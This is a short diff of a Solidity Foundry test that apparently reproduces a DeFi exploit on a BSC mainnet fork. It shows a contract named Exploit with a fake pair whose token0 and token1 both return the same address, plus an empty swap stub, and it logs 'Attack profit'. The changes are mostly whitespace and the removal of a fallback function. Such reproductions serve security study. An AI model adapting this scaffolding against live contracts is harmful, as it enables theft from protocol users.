@@ -15,8 +15,7 @@ contract Exploit {
     function token0() public view returns(address){ 
         return _token0;
     }
-    
-    
+   
     function token1() public view returns(address){ 
         return _token0;
     }
@@ -37,6 +36,7 @@ contract Exploit {
         }
 
     }
+    
      function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) public {
  
      }
@@ -52,12 +52,12 @@ contract test is Test{
     function setUp() public {
         cheats.createSelectFork("bsc", 21297409);
     }
+    
     function testExploit() public {
         exploit = new Exploit();
         exploit.Statr();
         verify();
     }
-    fallback() external payable{}
    
    function verify() public {
    console.log("============== Attack profit: ==============");
